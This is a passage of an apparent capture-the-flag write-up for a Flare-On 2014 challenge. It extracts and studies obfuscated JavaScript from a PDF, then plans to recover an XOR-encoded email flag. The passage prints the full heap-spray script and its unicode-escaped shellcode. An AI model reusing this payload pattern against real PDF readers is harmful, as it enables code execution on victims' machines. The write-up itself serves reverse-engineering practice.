</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00000000</span> (<span style=color:#2aa198>02</span>) <span style=color:#2aa198>0020</span>                 <span style=color:#268bd2>ADD</span> [<span style=color:#b58900>EAX</span>], <span style=color:#b58900>AH</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00000002</span> (<span style=color:#2aa198>01</span>) <span style=color:#2aa198>50</span>                   <span style=color:#268bd2>PUSH</span> <span style=color:#b58900>EAX</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00000003</span> (<span style=color:#2aa198>03</span>) <span style=color:#268bd2>ff40</span> <span style=color:#2aa198>00</span>              <span style=color:#268bd2>INC</span> <span style=color:#dc322f>DWORD</span> [<span style=color:#b58900>EAX</span><span style=color:#719e07>+</span><span style=color:#2aa198>0x0</span>]
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00000006</span> (<span style=color:#2aa198>03</span>) <span style=color:#2aa198>0069</span> <span style=color:#2aa198>00</span>              <span style=color:#268bd2>ADD</span> [<span style=color:#b58900>ECX</span><span style=color:#719e07>+</span><span style=color:#2aa198>0x0</span>], <span style=color:#b58900>CH</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00000009</span> (<span style=color:#2aa198>01</span>) <span style=color:#2aa198>00</span>                   <span style=color:#268bd2>DB</span> <span style=color:#2aa198>0x0</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000000a</span> (<span style=color:#2aa198>01</span>) <span style=color:#2aa198>05</span>                   <span style=color:#268bd2>DB</span> <span style=color:#2aa198>0x5</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000000b</span> (<span style=color:#2aa198>01</span>) <span style=color:#2aa198>69</span>                   <span style=color:#268bd2>DB</span> <span style=color:#2aa198>0x69</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000000c</span> (<span style=color:#2aa198>01</span>) <span style=color:#2aa198>50</span>                   <span style=color:#268bd2>PUSH</span> <span style=color:#b58900>EAX</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000000d</span> (<span style=color:#2aa198>01</span>) <span style=color:#2aa198>50</span>                   <span style=color:#268bd2>PUSH</span> <span style=color:#b58900>EAX</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Let's take a look at stream 1 using <code>pdfvi</code>.</p><figure class=code><figcaption><span>Stream 1</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">71
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>[<span style=color:#2aa198>0x00000000</span>]<span style=color:#719e07>&gt;</span> pdfvi
</span></span><span style=display:flex><span>Applying Filter FlateDecode ...
</span></span><span style=display:flex><span>Applying Filter ASCIIHexDecode ...
</span></span><span style=display:flex><span>Encoded Stream <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span><span style=color:#719e07>--------------------------------------------------------------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#268bd2>var</span> HdPN <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#268bd2>var</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#586e75>// important
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>    <span style=color:#268bd2>var</span> IxTUQnOvHg <span style=color:#719e07>=</span> unescape(<span style=color:#2aa198>&#34;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9
</span></span></span><span style=display:flex><span><span style=color:#2aa198>ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412
</span></span></span><span style=display:flex><span><span style=color:#2aa198>d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub
</span></span></span><span style=display:flex><span><span style=color:#2aa198>7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7
</span></span></span><span style=display:flex><span><span style=color:#2aa198>e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4
</span></span></span><span style=display:flex><span><span style=color:#2aa198>190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21b
</span></span></span><span style=display:flex><span><span style=color:#2aa198>f%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u7
</span></span></span><span style=display:flex><span><span style=color:#2aa198>69b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb
</span></span></span><span style=display:flex><span><span style=color:#2aa198>0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4
</span></span></span><span style=display:flex><span><span style=color:#2aa198>879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u881
</span></span></span><span style=display:flex><span><span style=color:#2aa198>4%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7
</span></span></span><span style=display:flex><span><span style=color:#2aa198>b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u257
</span></span></span><span style=display:flex><span><span style=color:#2aa198>7%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u4
</span></span></span><span style=display:flex><span><span style=color:#2aa198>1b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u317
</span></span></span><span style=display:flex><span><span style=color:#2aa198>4%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue
</span></span></span><span style=display:flex><span><span style=color:#2aa198>3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b
</span></span></span><span style=display:flex><span><span style=color:#2aa198>9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u0
</span></span></span><span style=display:flex><span><span style=color:#2aa198>27c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033
</span></span></span><span style=display:flex><span><span style=color:#2aa198>c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8
</span></span></span><span style=display:flex><span><span style=color:#2aa198>b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u726
</span></span></span><span style=display:flex><span><span style=color:#2aa198>2%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2
</span></span></span><span style=display:flex><span><span style=color:#2aa198>c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua31
</span></span></span><span style=display:flex><span><span style=color:#2aa198>6%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u9
</span></span></span><span style=display:flex><span><span style=color:#2aa198>8a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81f
</span></span></span><span style=display:flex><span><span style=color:#2aa198>f%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%
</span></span></span><span style=display:flex><span><span style=color:#2aa198>u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5
</span></span></span><span style=display:flex><span><span style=color:#2aa198>068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#586e75>// not important
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>    <span style=color:#268bd2>var</span> MPBPtdcBjTlpvyTYkSwgkrWhXL <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#719e07>for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>=</span><span style=color:#2aa198>128</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>&gt;=</span><span style=color:#2aa198>0</span>;<span style=color:#719e07>--</span>EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL<span style=color:#719e07>+=</span> unescape(<span style=color:#2aa198>&#34;%ub32f%u3791&#34;</span>);
</span></span><span style=display:flex><span>    ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv <span style=color:#719e07>=</span> MPBPtdcBjTlpvyTYkSwgkrWhXL <span style=color:#719e07>+</span> IxTUQnOvHg;
</span></span><span style=display:flex><span>    OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY <span style=color:#719e07>=</span> unescape(<span style=color:#2aa198>&#34;%ub32f%u3791&#34;</span>);
</span></span><span style=display:flex><span>    fJWhwERSDZtaZXlhcREfhZjCCVqFAPS <span style=color:#719e07>=</span> <span style=color:#2aa198>20</span>;
</span></span><span style=display:flex><span>    fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA <span style=color:#719e07>=</span> fJWhwERSDZtaZXlhcREfhZjCCVqFAPS<span style=color:#719e07>+</span>ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length
</span></span><span style=display:flex><span>    <span style=color:#719e07>while</span> (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length<span style=color:#719e07>&lt;</span>fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHT<span style=color:#719e07>+=</span>OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
</span></span><span style=display:flex><span>    UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb <span style=color:#719e07>=</span> OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(<span style=color:#2aa198>0</span>, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
</span></span><span style=display:flex><span>    MOysyGgYplwyZzNdETHwkru <span style=color:#719e07>=</span> OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(<span style=color:#2aa198>0</span>, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length<span style=color:#719e07>-</span>fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
</span></span><span style=display:flex><span>    <span style=color:#719e07>while</span>(MOysyGgYplwyZzNdETHwkru.length<span style=color:#719e07>+</span>fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA <span style=color:#719e07>&lt;</span> <span style=color:#2aa198>0x40000</span>) MOysyGgYplwyZzNdETHwkru <span style=color:#719e07>=</span> MOysyGgYplwyZzNdETHwkru<span style=color:#719e07>+</span>MOysyGgYplwyZzNdETHwkr<span style=color:#719e07>+</span>UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
</span></span><span style=display:flex><span>    DPwxazRhwbQGu <span style=color:#719e07>=</span> <span style=color:#719e07>new</span> <span style=color:#b58900>Array</span>();
</span></span><span style=display:flex><span>    <span style=color:#719e07>for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>=</span><span style=color:#2aa198>0</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>&lt;</span><span style=color:#2aa198>100</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>++</span>) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] <span style=color:#719e07>=</span> MOysyGgYplwyZzNdETHwkru <span style=color:#719e07>+</span> ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#719e07>for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>=</span><span style=color:#2aa198>142</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>&gt;=</span><span style=color:#2aa198>0</span>;<span style=color:#719e07>--</span>EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf <span style=color:#719e07>+=</span> unescape(<span style=color:#2aa198>&#34;%ub550%u0166&#34;</span>);
</span></span><span style=display:flex><span>    bGtvKT <span style=color:#719e07>=</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length <span style=color:#719e07>+</span> <span style=color:#2aa198>20</span>;
</span></span><span style=display:flex><span>        <span style=color:#719e07>while</span> (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length <span style=color:#719e07>&lt;</span> bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf <span style=color:#719e07>+=</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
</span></span><span style=display:flex><span>    Juphd <span style=color:#719e07>=</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(<span style=color:#2aa198>0</span>, bGtvKT);
</span></span><span style=display:flex><span>    QCZabMzxQiD <span style=color:#719e07>=</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(<span style=color:#2aa198>0</span>, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length<span style=color:#719e07>-</span>bGtvKT);
</span></span><span style=display:flex><span>    <span style=color:#719e07>while</span>(QCZabMzxQiD.length<span style=color:#719e07>+</span>bGtvKT <span style=color:#719e07>&lt;</span> <span style=color:#2aa198>0x40000</span>) QCZabMzxQiD <span style=color:#719e07>=</span> QCZabMzxQiD<span style=color:#719e07>+</span>QCZabMzxQiD<span style=color:#719e07>+</span>Juphd;
</span></span><span style=display:flex><span>    FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE <span style=color:#719e07>=</span> <span style=color:#719e07>new</span> <span style=color:#b58900>Array</span>();
</span></span><span style=display:flex><span>    <span style=color:#719e07>for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>=</span><span style=color:#2aa198>0</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>&lt;</span><span style=color:#2aa198>125</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<span style=color:#719e07>++</span>) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]<span style=color:#719e07>=</span> QCZabMzxQiD <span style=color:#719e07>+</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;</span></span></code></pre></td></tr></table></div></div></div></figure><p>Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable <code>IxTUQnOvHg</code> looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. <code>%u72f9</code> should be converted to <code>0xf972</code>. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: <a href=http://sandsprite.com/shellcode_2_exe.php target=_blank rel="noreferrer noopener">http://sandsprite.com/shellcode_2_exe.php</a>.</p><p>After running the executable in Immunity debugger a message box pops up with an encoded message. If we look inside memory, we can find this string:</p><p><img src=/images/2014/flare/4-1.jpg alt="MessageBox Text" title="MessageBox Text"></p><figure class=code><figcaption><span>First string in hex</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>2574243575216<span style=color:#268bd2>B2A36366B2F3274752E2A2305316B203723256B2B2D46</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>The length is close to the email (29 bytes). Here's what I thought. If it is the email then the last 13 bytes should be <code>@flare-on.com</code>. It's probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If <code>plaintext xor key = ciphertext</code> then <code>key = plaintext xor ciphertext</code>. If we xor the last 13 bytes of ciphertext with <code>@flare-on.com</code> then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a <code>one time pad</code>) it is repeated.</p><p>The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.</p><figure class=code><figcaption><span>First string xor</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
